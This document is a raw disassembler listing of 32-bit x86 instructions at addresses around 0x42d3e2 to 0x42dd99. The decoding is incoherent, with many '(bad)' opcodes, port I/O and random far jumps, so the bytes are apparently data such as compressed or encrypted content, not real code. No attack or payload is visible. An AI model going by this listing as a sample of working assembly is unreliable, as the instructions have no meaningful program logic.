  42d3e2:	daa    
  42d3e3:	mov    esi,0x5dd010ed
  42d3e8:	scas   al,BYTE PTR es:[edi]
  42d3e9:	cmp    BYTE PTR [edx+0x3a],ah
  42d3ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d3ed:	xor    eax,0x3bbda667
  42d3f2:	sub    dh,0x6a
  42d3f5:	mov    esp,0x4198f926
  42d3fa:	gs or  al,0x3a
  42d3fd:	(bad)  
  42d3fe:	popa   
  42d3ff:	fcomip st,st(4)
  42d401:	jecxz  0x42d437
  42d403:	mov    esp,0x1f6b3745
  42d408:	cld    
  42d409:	iret   
  42d40a:	and    BYTE PTR ds:0x799e66e2,cl
  42d410:	pop    edi
  42d411:	inc    ebx
  42d412:	jns    0x42d3f7
  42d414:	stos   BYTE PTR es:[edi],al
  42d415:	mov    ebp,0xcefc993b
  42d41a:	inc    esi
  42d41b:	js     0x42d40c
  42d41d:	cs jns 0x42d45e
  42d420:	outs   dx,DWORD PTR ds:[esi]
  42d421:	lahf   
  42d422:	mov    ebp,0x3d3da2a4
  42d427:	in     al,0xe7
  42d429:	jl     0x42d3fe
  42d42b:	mov    dl,0xaf
  42d42d:	leave  
  42d42e:	cmp    BYTE PTR [edx],bl
  42d430:	(bad)  
  42d431:	fcom   st(6)
  42d433:	inc    edx
  42d434:	cmp    DWORD PTR [ebx-0x8],ebx
  42d437:	pop    ss
  42d438:	enter  0xc60a,0xb7
  42d43c:	cmp    DWORD PTR [eax+0x47d3b3ef],edi
  42d442:	aam    0x27
  42d444:	stos   DWORD PTR es:[edi],eax
  42d445:	jo     0x42d3d5
  42d447:	fsubp  st(2),st
  42d449:	mov    edi,eax
  42d44b:	dec    esi
  42d44c:	fwait
  42d44d:	jecxz  0x42d409
  42d44f:	fcomp  QWORD PTR [edi]
  42d451:	jmp    FWORD PTR [eax-0x6e39126a]
  42d457:	das    
  42d458:	not    ecx
  42d45a:	sbb    eax,0x1fad6bed
  42d45f:	rol    BYTE PTR [eax+0x58],cl
  42d462:	and    ebp,0x2a62cc4a
  42d468:	push   ss
  42d469:	jmp    0x42d43f
  42d46b:	ds xor eax,0x3a2444a2
  42d471:	mov    dl,0x6c
  42d473:	imul   edx,DWORD PTR [esi-0x40e70d40],0xffffffcd
  42d47a:	jnp    0x42d4ad
  42d47c:	mov    ebp,0xcbfe269a
  42d481:	(bad)  
  42d482:	jge    0x42d4bb
  42d484:	retf   
  42d485:	dec    ecx
  42d486:	mov    esp,0xd60e70da
  42d48b:	xor    eax,0x21bf2ae9
  42d490:	in     eax,dx
  42d491:	lahf   
  42d492:	mov    esi,0x128899f0
  42d497:	lahf   
  42d498:	and    BYTE PTR [ebx+0x6d94ab86],cl
  42d49e:	or     DWORD PTR [edx],0xffffffc8
  42d4a1:	sar    BYTE PTR [ecx],0x16
  42d4a4:	pushf  
  42d4a5:	and    BYTE PTR [ebx],dh
  42d4a7:	in     al,dx
  42d4a8:	cmpxchg edi,edx
  42d4ab:	cmp    ebp,esi
  42d4ad:	push   0x49f01520
  42d4b2:	or     ebp,DWORD PTR [esp+esi*2+0x0]
	...
  42d515:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d51b:	ja     0x42d4f6
  42d51d:	inc    DWORD PTR [eax]
  42d51f:	add    edx,DWORD PTR [eax+0x21a13af3]
  42d525:	in     al,dx
  42d526:	push   esi
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    al,bh
  42d52f:	ss fs inc ebp
  42d532:	popf   
  42d533:	cmp    eax,0xed3f9163
  42d538:	mov    edx,ebx
  42d53a:	xchg   DWORD PTR [edx+0x69],esi
  42d53d:	call   0xfdaf:0x317c4b14
  42d544:	xchg   DWORD PTR [esi+0x54],eax
  42d547:	jno    0x42d51e
  42d549:	cld    
  42d54a:	(bad)  
  42d54b:	cld    
  42d54c:	lock mov al,0x5
  42d54f:	jnp    0x42d592
  42d551:	pop    ss
  42d552:	dec    ebx
  42d553:	pop    edx
  42d554:	inc    edx
  42d555:	sub    BYTE PTR [esi+0x4e],bl
  42d558:	out    dx,eax
  42d559:	xor    ch,BYTE PTR [eax+edi*8-0x76]
  42d55d:	jecxz  0x42d50f
  42d55f:	(bad)  
  42d561:	test   DWORD PTR [ebx-0x2e],ebx
  42d564:	xchg   esp,eax
  42d565:	push   ss
  42d566:	pop    ecx
  42d567:	shl    BYTE PTR [edx-0x72e2175a],1
  42d56d:	adc    eax,0xff74defe
  42d572:	outs   dx,DWORD PTR ds:[esi]
  42d573:	in     al,dx
  42d574:	sub    al,0x56
  42d576:	mov    esi,0xff451ba2
  42d57b:	cld    
  42d57c:	lods   al,BYTE PTR ds:[esi]
  42d57d:	dec    edi
  42d57e:	and    DWORD PTR [edi],eax
  42d580:	dec    edi
  42d581:	xchg   ebp,eax
  42d582:	push   ecx
  42d583:	stc    
  42d584:	jl     0x42d585
  42d586:	xchg   ecx,eax
  42d587:	push   esi
  42d588:	jbe    0x42d517
  42d58a:	mov    cl,0x6d
  42d58c:	test   BYTE PTR [ecx+0x1ded46ab],al
  42d592:	cs dec bl
  42d595:	push   ebx
  42d596:	add    DWORD PTR [edx],edi
  42d598:	repz jmp 0x42d557
  42d59b:	loope  0x42d5ee
  42d59d:	pop    ecx
  42d59e:	sbb    ebx,DWORD PTR [edx+0x1e64e253]
  42d5a4:	mov    ds:0x970612ec,al
  42d5a9:	add    eax,DWORD PTR [esi-0x5340d37c]
  42d5af:	rol    BYTE PTR ds:0x1e7dde2a,1
  42d5b5:	adc    al,dh
  42d5b7:	or     ah,BYTE PTR [esi]
  42d5b9:	leave  
  42d5ba:	xchg   edi,eax
  42d5bb:	stos   DWORD PTR es:[edi],eax
  42d5bc:	add    al,0x75
  42d5be:	cmp    DWORD PTR [edx],edx
  42d5c0:	in     al,0xe2
  42d5c2:	dec    esp
  42d5c3:	test   BYTE PTR [edi+0x5c04e0ce],dh
  42d5c9:	aam    0x19
  42d5cb:	repnz lds ebx,FWORD PTR ds:[eax+0xa]
  42d5d0:	cmp    BYTE PTR [edi-0xd795221],ch
  42d5d6:	ret    0xbd34
  42d5d9:	add    dh,BYTE PTR [eax-0x3978a632]
  42d5df:	fimul  DWORD PTR ds:0x23077076
  42d5e5:	inc    edi
  42d5e6:	out    0x3c,eax
  42d5e8:	jg     0x42d609
  42d5ea:	mov    eax,0xa48e67d
  42d5ef:	jp     0x42d63d
  42d5f1:	or     eax,0x239baefd
  42d5f6:	lds    esp,FWORD PTR [eax-0x74aac4eb]
  42d5fc:	stos   DWORD PTR es:[edi],eax
  42d5fd:	sub    bh,BYTE PTR [eax+esi*4+0x47]
  42d601:	dec    esi
  42d602:	mov    ds:0x96ed750a,eax
  42d607:	pop    es
  42d608:	and    BYTE PTR [edi],cl
  42d60a:	and    BYTE PTR [edx],al
  42d60c:	push   0x41ccb6e4
  42d611:	cmp    BYTE PTR [eax+ebx*4+0x7a],al
  42d615:	xor    eax,0xba34d3c4
  42d61a:	int3   
  42d61b:	jb     0x42d5f7
  42d61d:	mov    bh,0xe5
  42d61f:	xor    bl,al
  42d621:	das    
  42d622:	and    ebx,DWORD PTR [eax]
  42d624:	xchg   ecx,eax
  42d625:	retf   
  42d626:	test   eax,0x65bda26b
  42d62b:	jne    0x42d611
  42d62d:	push   ebp
  42d62e:	push   es
  42d62f:	lods   al,BYTE PTR ds:[esi]
  42d630:	dec    eax
  42d631:	mov    edi,0xad7f6a
	...
  42d696:	repz add esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0x3b588d59
  42d6a4:	cmp    ch,BYTE PTR [ecx+0x1e65d]
  42d6aa:	pop    es
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [ebx+0x4d],ah
  42d6b0:	xchg   DWORD PTR [ebx-0x53c9bdc4],ebp
  42d6b6:	addr16 xchg edi,eax
  42d6b8:	(bad)  [ebp+0x7a2a61bd]
  42d6be:	pop    ds
  42d6bf:	call   0x6b65:0x16c6be38
  42d6c6:	dec    edx
  42d6c7:	je     0x42d697
  42d6c9:	bound  eax,QWORD PTR [esi-0x7b]
  42d6cc:	neg    DWORD PTR [ecx-0x7e00288]
  42d6d2:	sbb    eax,0x9f575dfc
  42d6d7:	add    al,0xb0
  42d6d9:	cmp    al,0x6f
  42d6db:	in     eax,dx
  42d6dc:	cmp    DWORD PTR [ebx],eax
  42d6de:	cs test eax,0x4eb81c68
  42d6e4:	and    DWORD PTR [edx],ebx
  42d6e6:	arpl   WORD PTR [ebx+esi*4+0x4b],dx
  42d6ea:	pushf  
  42d6eb:	in     eax,dx
  42d6ec:	int    0xed
  42d6ee:	sbb    DWORD PTR [edx-0x790dc5a0],edx
  42d6f4:	pop    ds
  42d6f5:	outs   dx,DWORD PTR ds:[esi]
  42d6f6:	sar    BYTE PTR [eax+0x7390b7f4],1
  42d6fc:	cli    
  42d6fd:	adc    DWORD PTR [eax+0x32],ebp
  42d700:	inc    ebp
  42d701:	push   edx
  42d702:	xabort 0x57
  42d705:	or     eax,0x5c4419fb
  42d70a:	scas   al,BYTE PTR es:[edi]
  42d70b:	ins    BYTE PTR es:[edi],dx
  42d70c:	pop    ecx
  42d70d:	mov    eax,ds:0xa8624b1e
  42d712:	ret    
  42d713:	repz test DWORD PTR [edx],ebp
  42d716:	cmp    edx,esi
  42d718:	xchg   ebx,eax
  42d719:	lds    eax,FWORD PTR [edx+0x5e]
  42d71c:	sbb    al,0x97
  42d71e:	push   ss
  42d71f:	bound  ebx,QWORD PTR [esi+0x19]
  42d722:	mov    edi,0x747f426e
  42d727:	pushf  
  42d728:	jl     0x42d777
  42d72a:	jmp    0x42d748
  42d72c:	adc    bl,BYTE PTR [ecx-0x60]
  42d72f:	in     al,dx
  42d730:	mov    eax,ds:0x9cd437cb
  42d735:	mov    ecx,0xdeacd033
  42d73a:	test   DWORD PTR [ecx],ecx
  42d73c:	not    BYTE PTR [edi-0x55c63d1d]
  42d742:	imul   ecx
  42d744:	loop   0x42d789
  42d746:	les    ecx,FWORD PTR [edi-0x40]
  42d749:	aas    
  42d74a:	repnz in al,0xd7
  42d74d:	aam    0x33
  42d74f:	cs mov ebx,0x20a4fb08
  42d755:	mov    DWORD PTR [edx+0x342f78d],edi
  42d75b:	daa    
  42d75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d75d:	fsubr  QWORD PTR [ebx]
  42d75f:	pop    es
  42d760:	fsubr  st,st(6)
  42d762:	push   DWORD PTR ds:[edi+0x71e291d1]
  42d769:	das    
  42d76a:	in     eax,dx
  42d76b:	es add eax,0xd01d5c8f
  42d771:	xchg   esp,eax
  42d772:	data16 shl cl,1
  42d775:	(bad)  
  42d776:	mov    bh,0x7d
  42d778:	gs (bad) 
  42d77a:	mov    cl,bl
  42d77c:	pushf  
  42d77d:	jmp    0xdaee:0x4e3e7f4b
  42d784:	mov    ah,0x8
  42d786:	xor    DWORD PTR [esi],ebx
  42d788:	and    eax,0xca5865aa
  42d78d:	adc    ah,BYTE PTR [edx+0x16]
  42d790:	xchg   edi,eax
  42d791:	dec    edx
  42d792:	stc    
  42d793:	cmp    eax,0xbce9ca7
  42d798:	in     al,dx
  42d799:	je     0x42d753
  42d79b:	cld    
  42d79c:	jg     0x42d804
  42d79e:	arpl   WORD PTR [edi+0x64],si
  42d7a1:	and    al,0xfa
  42d7a3:	cdq    
  42d7a4:	(bad)  
  42d7a5:	(bad)  
  42d7a6:	jmp    0xa4441039
  42d7ab:	sub    al,0x4c
  42d7ad:	pushf  
  42d7ae:	xor    DWORD PTR [esp+esi*4-0x29cf6314],ebx
	...
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0xd28a1795
  42d825:	xchg   DWORD PTR [edi+eiz*8+0x1],esp
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR ds:0xd103a134,bl
  42d833:	jb     0x42d801
  42d835:	jp     0x42d806
  42d837:	add    bh,dl
  42d839:	iret   
  42d83a:	popa   
  42d83b:	cvttps2pi mm4,QWORD PTR fs:[ebp-0x1fac9dfa]
  42d843:	push   ds
  42d844:	inc    esi
  42d845:	jg     0x42d860
  42d847:	daa    
  42d848:	std    
  42d849:	arpl   WORD PTR [ebp+0x5d],di
  42d84c:	mov    eax,ds:0x26b21b4a
  42d851:	inc    ebp
  42d852:	mov    ds:0x6a166be9,eax
  42d857:	mov    eax,0x790cfffc
  42d85c:	mov    ebx,0xea131415
  42d861:	lock loopne 0x42d854
  42d864:	fistp  DWORD PTR [bp+di+0x6b]
  42d868:	jnp    0x42d863
  42d86a:	scas   al,BYTE PTR es:[edi]
  42d86b:	repz adc ah,BYTE PTR [ecx+ebx*1-0x409aa0ac]
  42d873:	jle    0x42d864
  42d875:	fcmovu st,st(3)
  42d877:	adc    al,0x43
  42d879:	fmulp  st(2),st
  42d87b:	cli    
  42d87c:	sbb    BYTE PTR [eax],bh
  42d87e:	jae    0x42d81a
  42d880:	push   ecx
  42d881:	into   
  42d882:	mov    ds:0x1b1777c1,eax
  42d887:	sbb    BYTE PTR [ebx-0x39],bh
  42d88a:	ds das 
  42d88c:	push   0x65729d19
  42d891:	mov    WORD PTR [eax+0x27],?
  42d894:	mov    dl,0xa
  42d896:	dec    eax
  42d897:	mov    ecx,0x84162293
  42d89c:	cwde   
  42d89d:	mov    bh,0x94
  42d89f:	mov    esp,0xbfc941eb
  42d8a4:	or     eax,0x4956df91
  42d8a9:	out    0xc6,al
  42d8ab:	ins    BYTE PTR es:[edi],dx
  42d8ac:	pusha  
  42d8ad:	jge    0x42d894
  42d8af:	sbb    al,0x5d
  42d8b1:	cmp    dh,BYTE PTR [edi]
  42d8b3:	loop   0x42d8de
  42d8b5:	xchg   esi,eax
  42d8b6:	std    
  42d8b7:	or     DWORD PTR [edx],0xc1d14d56
  42d8bd:	retf   
  42d8be:	fadd   QWORD PTR [esi+0x33]
  42d8c1:	or     esp,esp
  42d8c3:	mov    al,al
  42d8c5:	in     al,0x45
  42d8c7:	cmp    DWORD PTR cs:[ebp-0x62daad29],eax
  42d8ce:	push   es
  42d8cf:	jle    0x42d8bc
  42d8d1:	push   0x7d
  42d8d3:	and    bl,dh
  42d8d5:	ins    DWORD PTR es:[edi],dx
  42d8d6:	fcomp  QWORD PTR [ebp-0x11]
  42d8d9:	push   esp
  42d8da:	xor    eax,0xfe10cb1
  42d8df:	mov    dl,0x90
  42d8e1:	rcr    edx,cl
  42d8e3:	inc    ebp
  42d8e4:	mov    esp,eax
  42d8e6:	jbe    0x42d8d0
  42d8e8:	jne    0x42d8a8
  42d8ea:	ss pop ds
  42d8ec:	push   0xff5d06c8
  42d8f1:	jae    0x42d94b
  42d8f3:	outs   dx,DWORD PTR ds:[esi]
  42d8f4:	mov    ah,BYTE PTR [ebx+0x55]
  42d8f7:	dec    edi
  42d8f8:	icebp  
  42d8f9:	pusha  
  42d8fa:	shl    BYTE PTR fs:[ecx+edi*2-0x18],1
  42d8ff:	pop    eax
  42d900:	push   ebp
  42d901:	je     0x42d904
  42d903:	mov    edi,0x18dbd4fc
  42d908:	mov    edi,0x4893b432
  42d90d:	mov    ch,BYTE PTR [esi-0x287a5c77]
  42d913:	push   ss
  42d914:	jae    0x42d902
  42d916:	xchg   esp,eax
  42d917:	pop    ss
  42d918:	test   al,0x62
  42d91a:	push   edi
  42d91b:	xor    al,0xac
  42d91d:	test   DWORD PTR ds:0xb7e0d7e9,0xe5af6c01
  42d927:	mov    eax,cs
  42d929:	mov    ch,0x53
  42d92b:	test   al,0x17
  42d92d:	and    BYTE PTR [ecx-0x30600652],dh
  42d933:	(bad)  
  42d934:	into   
	...
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0xd408af14,ecx
  42d9a5:	outs   dx,DWORD PTR ds:[esi]
  42d9a6:	imul   ebp,eax,0x1
  42d9a9:	add    BYTE PTR [edi],al
  42d9ab:	add    DWORD PTR [eax],eax
  42d9ad:	add    ah,ch
  42d9af:	mov    dl,0xaa
  42d9b1:	mov    ah,0x7e
  42d9b3:	lds    esi,FWORD PTR [eax]
  42d9b5:	xchg   ebx,eax
  42d9b6:	(bad)  
  42d9b8:	dec    esi
  42d9b9:	mov    eax,ds:0xdc22051e
  42d9be:	pop    es
  42d9bf:	scas   eax,DWORD PTR es:[edi]
  42d9c0:	mov    esp,0xcb739405
  42d9c5:	sub    al,0x40
  42d9c7:	sub    al,0x98
  42d9c9:	les    eax,FWORD PTR [ebx-0x5e2800b8]
  42d9cf:	fadd   st,st(1)
  42d9d1:	sbb    eax,0xc01a187a
  42d9d6:	mov    eax,ds:0x4b113c29
  42d9db:	push   ebp
  42d9dc:	fs lahf 
  42d9de:	mov    DWORD PTR [ebx+0x6f],ebx
  42d9e1:	jbe    0x42da3e
  42d9e3:	sbb    eax,0xd2549f1a
  42d9e8:	adc    eax,0x1e6b582e
  42d9ed:	addr16 lock inc edx
  42d9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9f1:	adc    al,0xb8
  42d9f3:	int3   
  42d9f4:	inc    ecx
  42d9f5:	or     ah,BYTE PTR [edi+0x46130447]
  42d9fb:	push   edx
  42d9fc:	lds    ebp,FWORD PTR [eax-0x61]
  42d9ff:	aas    
  42da00:	es in  al,dx
  42da02:	pushf  
  42da03:	and    BYTE PTR [esi+0x7d7a6f48],0xe0
  42da0a:	repnz mov ebx,0x43db4137
  42da10:	add    eax,0x6ad7ee51
  42da15:	lods   al,BYTE PTR ds:[esi]
  42da16:	and    BYTE PTR [edi-0x18],dh
  42da19:	pusha  
  42da1a:	cld    
  42da1b:	dec    edx
  42da1c:	in     eax,0xf7
  42da1e:	stc    
  42da1f:	push   0x7
  42da21:	ret    
  42da22:	icebp  
  42da23:	mov    ecx,0xe087a151
  42da28:	ret    
  42da29:	add    eax,0x4a18cacc
  42da2e:	xchg   ecx,edx
  42da30:	pop    ds
  42da31:	sub    ah,bl
  42da33:	iret   
  42da34:	mov    BYTE PTR [esp+eiz*4-0x909ec03],0x97
  42da3c:	xchg   edi,esp
  42da3e:	test   al,0x17
  42da40:	inc    edx
  42da41:	jecxz  0x42da7a
  42da43:	dec    edi
  42da44:	dec    ecx
  42da45:	ror    BYTE PTR [ebx+0x4b5129a0],0x2c
  42da4c:	int3   
  42da4d:	pop    DWORD PTR ds:[esi]
  42da50:	int3   
  42da51:	xor    eax,0x311509cc
  42da56:	dec    ecx
  42da57:	sbb    al,0x1e
  42da59:	push   0x2c
  42da5b:	rcl    DWORD PTR [edx-0x6a],cl
  42da5e:	cmp    al,0x48
  42da60:	xor    BYTE PTR [esi],dl
  42da62:	jge    0x42da71
  42da64:	cwde   
  42da65:	pop    ebx
  42da66:	push   ebp
  42da67:	outs   dx,DWORD PTR ds:[esi]
  42da68:	jne    0x42d9ed
  42da6a:	loopne 0x42dad6
  42da6c:	push   0x770ecf4e
  42da71:	jae    0x42da19
  42da73:	or     DWORD PTR [ebx+edx*2-0x4e],0x41
  42da78:	sbb    ah,BYTE PTR [eax-0x61ea7020]
  42da7e:	xlat   BYTE PTR ds:[ebx]
  42da7f:	loopne 0x42daaa
  42da81:	scas   eax,DWORD PTR es:[edi]
  42da82:	pop    eax
  42da83:	or     BYTE PTR [esi+0x294d3211],0xab
  42da8a:	ins    BYTE PTR es:[edi],dx
  42da8b:	push   cs
  42da8c:	inc    eax
  42da8d:	pusha  
  42da8e:	xchg   esp,eax
  42da8f:	adc    DWORD PTR [esi-0x75],eax
  42da92:	push   edi
  42da93:	mov    esp,ebx
  42da95:	hlt    
  42da96:	sub    ah,cl
  42da98:	pop    esi
  42da99:	xchg   ecx,eax
  42da9a:	mov    bh,0xa5
  42da9c:	pop    ds
  42da9d:	fsub   DWORD PTR [esi]
  42da9f:	pushf  
  42daa0:	mov    ebp,0x2447f5eb
  42daa5:	or     ah,ah
  42daa7:	cwde   
  42daa8:	in     eax,0xaa
  42daaa:	dec    esi
  42daab:	push   0xbf2655bd
  42dab0:	into   
  42dab1:	dec    eax
  42dab2:	test   DWORD PTR [esi+0x75],ecx
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42db12
  42db23:	xlat   BYTE PTR ds:[ebx]
  42db24:	pop    es
  42db25:	mov    ebx,0x1e972
  42db2a:	pop    es
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    al,ah
  42db2f:	retf   
  42db30:	mov    ebx,0xe0ce943a
  42db35:	stos   BYTE PTR es:[edi],al
  42db36:	push   cs
  42db37:	push   edi
  42db38:	inc    esi
  42db39:	sub    al,0xc4
  42db3b:	jmp    0x42dba8
  42db3d:	and    al,0xbc
  42db3f:	push   cs
  42db40:	xchg   edx,eax
  42db41:	stos   BYTE PTR es:[edi],al
  42db42:	mov    dh,0x6e
  42db44:	(bad)  
  42db45:	int3   
  42db46:	ret    
  42db47:	pop    eax
  42db48:	(bad)  
  42db49:	call   0x8043778
  42db4e:	sub    ch,al
  42db50:	pop    ebx
  42db51:	dec    edi
  42db52:	repnz std 
  42db54:	add    eax,0xfe28a035
  42db59:	(bad)  
  42db5a:	dec    ecx
  42db5b:	mov    cl,0xd3
  42db5d:	sar    DWORD PTR [ecx+0x1410332e],1
  42db63:	int    0x34
  42db65:	lock cld 
  42db67:	shl    ebp,0xfe
  42db6a:	pop    ds
  42db6b:	add    BYTE PTR [ebp+0x76c2b864],ch
  42db71:	out    0x33,eax
  42db73:	mov    ebp,0xab0be52d
  42db78:	sub    eax,0xbe795c76
  42db7d:	cmp    eax,0x5d6ff5a7
  42db82:	out    0x9b,eax
  42db84:	stos   DWORD PTR es:[edi],eax
  42db85:	jnp    0x42dbe3
  42db87:	jecxz  0x42dbc4
  42db89:	jmp    0xa2ca:0xafd717ba
  42db90:	jp     0x42dbfe
  42db92:	xchg   DWORD PTR [edx],esi
  42db94:	ins    BYTE PTR es:[edi],dx
  42db95:	inc    ecx
  42db96:	cld    
  42db97:	xor    BYTE PTR [ecx-0x5c],ch
  42db9a:	push   0xd575d8f1
  42db9f:	cs mov dl,0xf7
  42dba2:	sub    BYTE PTR [esi],cl
  42dba4:	adc    eax,0x2ca251b
  42dba9:	test   ah,al
  42dbab:	jns    0x42db56
  42dbad:	add    DWORD PTR [ecx+ecx*8+0x33907483],ebx
  42dbb4:	adc    ebx,edx
  42dbb6:	sub    DWORD PTR [edi],edx
  42dbb8:	shr    DWORD PTR [edi-0x44],1
  42dbbb:	popf   
  42dbbc:	rcr    ebx,0xe1
  42dbbf:	cmp    DWORD PTR gs:[ecx+eiz*4],eax
  42dbc3:	or     DWORD PTR [esi-0x58],esp
  42dbc6:	jo     0x42db85
  42dbc8:	mov    bh,0x78
  42dbca:	hlt    
  42dbcb:	xchg   ecx,eax
  42dbcc:	mov    edx,0x2c86acea
  42dbd1:	pop    esi
  42dbd2:	dec    ecx
  42dbd3:	fs js  0x42db77
  42dbd6:	push   cs
  42dbd7:	jge    0x42db5d
  42dbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbda:	xchg   ecx,eax
  42dbdb:	push   ds
  42dbdc:	test   BYTE PTR [ecx],ah
  42dbde:	inc    esp
  42dbdf:	jp     0x42dbc5
  42dbe1:	repz jl 0x42db96
  42dbe4:	xchg   ebp,eax
  42dbe5:	lahf   
  42dbe6:	outs   dx,BYTE PTR ds:[esi]
  42dbe7:	jmp    0x42dc34
  42dbe9:	or     dl,BYTE PTR [edi+0x5d]
  42dbec:	mov    ah,0x12
  42dbee:	mov    ah,0xd4
  42dbf0:	dec    ebx
  42dbf1:	push   edx
  42dbf2:	iret   
  42dbf3:	aas    
  42dbf4:	adc    ecx,DWORD PTR [edx]
  42dbf6:	nop
  42dbf7:	xchg   esi,eax
  42dbf8:	ins    DWORD PTR es:[edi],dx
  42dbf9:	test   al,0x99
  42dbfb:	cmovnp ecx,DWORD PTR [eax+0x3b80a47f]
  42dc02:	enter  0x8e7a,0xc0
  42dc06:	sbb    al,0xd9
  42dc08:	sahf   
  42dc09:	push   ebx
  42dc0a:	pop    edx
  42dc0b:	cs sahf 
  42dc0d:	jo     0x42dbe6
  42dc0f:	xor    eax,0x36003f41
  42dc14:	sbb    ecx,DWORD PTR [ebx+0x473215bf]
  42dc1a:	bswap  ecx
  42dc1c:	mov    DWORD PTR [edi],esp
  42dc1e:	in     eax,dx
  42dc1f:	pop    esp
  42dc20:	js     0x42dc92
  42dc22:	data16 mov WORD PTR [eax+0x424151b3],fs
  42dc29:	out    0x80,eax
  42dc2b:	inc    ecx
  42dc2c:	test   al,0xd0
  42dc2e:	out    dx,eax
  42dc2f:	mov    ah,0x6
  42dc31:	stos   DWORD PTR es:[edi],eax
  42dc32:	int3   
  42dc33:	xor    eax,0x6
	...
  42dc94:	add    BYTE PTR [eax],al
  42dc96:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0xf6b5f285
  42dca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dca5:	dec    esi
  42dca6:	jns    0x42dc92
  42dca8:	add    DWORD PTR [eax],eax
  42dcaa:	pop    es
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR ds:0x20f335f6,cl
  42dcb3:	dec    ecx
  42dcb4:	sub    BYTE PTR [ecx-0x525340ab],dl
  42dcba:	and    ebp,DWORD PTR [esi-0x462b3c66]
  42dcc0:	mov    esp,0xd2961001
  42dcc5:	xchg   edi,ebp
  42dcc7:	sbb    BYTE PTR [ebx],bl
  42dcc9:	stc    
  42dcca:	jl     0x42dd25
  42dccc:	jle    0x42dc7f
  42dcce:	xchg   esi,eax
  42dccf:	aas    
  42dcd0:	rcl    DWORD PTR [edx+0x71e266cd],cl
  42dcd6:	repnz push esp
  42dcd8:	pop    ecx
  42dcd9:	or     al,0xba
  42dcdb:	aas    
  42dcdc:	pop    ebp
  42dcdd:	pop    es
  42dcde:	and    eax,0x4bf04cfa
  42dce3:	sahf   
  42dce4:	call   0xf0a0:0xc8a85370
  42dceb:	push   0x7e
  42dced:	and    eax,0x71586147
  42dcf2:	inc    esi
  42dcf3:	push   ecx
  42dcf4:	retf   0xb05e
  42dcf7:	in     eax,dx
  42dcf8:	dec    edi
  42dcf9:	inc    ecx
  42dcfa:	mov    bl,0x9e
  42dcfc:	fcmovne st,st(0)
  42dcfe:	ret    
  42dcff:	push   edi
  42dd00:	push   cs
  42dd01:	xor    dh,ah
  42dd03:	iret   
  42dd04:	dec    ebx
  42dd05:	pop    ebx
  42dd06:	mov    ecx,0x65d46417
  42dd0b:	dec    edi
  42dd0c:	outs   dx,DWORD PTR ds:[esi]
  42dd0d:	fwait
  42dd0e:	popf   
  42dd0f:	(bad)  
  42dd10:	xchg   ebp,eax
  42dd11:	ror    DWORD PTR [esi],cl
  42dd13:	mov    edi,esi
  42dd15:	pushf  
  42dd16:	mov    ch,0xa2
  42dd18:	sbb    DWORD PTR [ecx+eax*8+0x78],esp
  42dd1c:	mov    BYTE PTR [ecx-0x75],ah
  42dd1f:	outs   dx,BYTE PTR ds:[esi]
  42dd20:	das    
  42dd21:	sub    al,BYTE PTR [esi]
  42dd23:	pop    esi
  42dd24:	pop    ds
  42dd25:	inc    edx
  42dd26:	aam    0x82
  42dd28:	jle    0x42dcef
  42dd2a:	shl    BYTE PTR [edx],1
  42dd2c:	call   0xd090b2f0
  42dd31:	cmp    BYTE PTR [edx],cl
  42dd33:	xchg   eax,esi
  42dd35:	in     eax,0xaa
  42dd37:	leave  
  42dd38:	pop    edx
  42dd39:	(bad)  
  42dd3a:	fstp   st(5)
  42dd3c:	pusha  
  42dd3d:	cmc    
  42dd3e:	xchg   DWORD PTR [ebx+0x1d390013],ecx
  42dd44:	push   esi
  42dd45:	jge    0x42dd36
  42dd47:	enter  0x3a76,0x2
  42dd4b:	mov    esp,0x5a0a3ec0
  42dd50:	les    esp,FWORD PTR [edi]
  42dd52:	push   ds
  42dd53:	jae    0x42dd8b
  42dd55:	mov    ah,0x8c
  42dd57:	jle    0x42dce4
  42dd59:	cmp    DWORD PTR [edi+ebx*4+0x66c16a39],edx
  42dd60:	adc    edx,edi
  42dd62:	push   edx
  42dd63:	cld    
  42dd64:	ins    BYTE PTR es:[edi],dx
  42dd65:	pushf  
  42dd66:	push   ds
  42dd67:	jnp    0x42dd4a
  42dd69:	adc    eax,0x33eaa6e5
  42dd6e:	cmp    BYTE PTR [ebx],cl
  42dd70:	mov    al,ds:0xc6afb39e
  42dd75:	ss cmp esp,edi
  42dd78:	dec    eax
  42dd79:	xchg   edx,eax
  42dd7a:	int    0x59
  42dd7c:	mov    dl,0xfc
  42dd7e:	cmp    esp,DWORD PTR [edx-0x31b84ffa]
  42dd84:	stos   DWORD PTR es:[edi],eax
  42dd85:	aaa    
  42dd86:	cmp    ecx,edi
  42dd88:	add    al,0x7e
  42dd8a:	mov    ebp,0x1c3e87a2
  42dd8f:	ss aas 
  42dd91:	or     eax,0xe682e422
  42dd96:	pop    ds
  42dd97:	or     DWORD PTR [edx],ebx
  42dd99:	nop
